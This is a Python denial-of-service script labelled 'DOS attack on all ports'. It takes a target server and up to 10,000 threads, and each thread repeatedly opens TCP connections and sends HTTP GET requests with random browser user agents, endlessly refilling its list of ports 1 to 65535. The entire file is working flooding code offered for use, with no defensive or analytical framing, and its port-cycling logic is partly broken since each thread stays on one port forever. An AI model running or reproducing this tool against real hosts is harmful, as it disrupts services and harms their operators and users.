import sys
import socket
import random
import threading
import time
import argparse

def user_agent():
    agents = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/89.0"
    ]
    return random.choice(agents)

def down_it(host, port):
    data = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent()}\r\n\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            s.send(data.encode('utf-8'))
            s.shutdown(socket.SHUT_WR)
            print(f"[+] Packet sent to {host}:{port}")
            s.close()
            time.sleep(0.05)
        except Exception as e:
            # uncomment below if you want to see errors (will flood console)
            # print(f"[-] Error sending to {host}:{port} -> {e}")
            time.sleep(0.05)

def worker(host, port_queue):
    while True:
        port = port_queue.pop()
        down_it(host, port)

def main():
    parser = argparse.ArgumentParser(description="DOS attack on all ports")
    parser.add_argument("-s", "--server", help="Target server IP or hostname", required=True)
    parser.add_argument("-t", "--threads", type=int, default=500, help="Number of threads (default 500, max 10000)")
    args = parser.parse_args()

    host = args.server
    threads = args.threads

    if threads > 10000:
        print("[!] Max threads is 10000")
        threads = 10000

    port_list = list(range(1, 65536))
    port_queue = port_list.copy()

    print(f"Starting attack on {host} on all ports with {threads} threads...")

    # We need a thread-safe structure or lock, but for simplicity use list with lock:
    import threading
    lock = threading.Lock()

    def thread_worker():
        while True:
            lock.acquire()
            if not port_queue:
                # refill ports to continue attack
                port_queue.extend(port_list)
            port = port_queue.pop()
            lock.release()
            down_it(host, port)

    for _ in range(threads):
        t = threading.Thread(target=thread_worker)
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
        sys.exit()

if __name__ == "__main__":
    main()
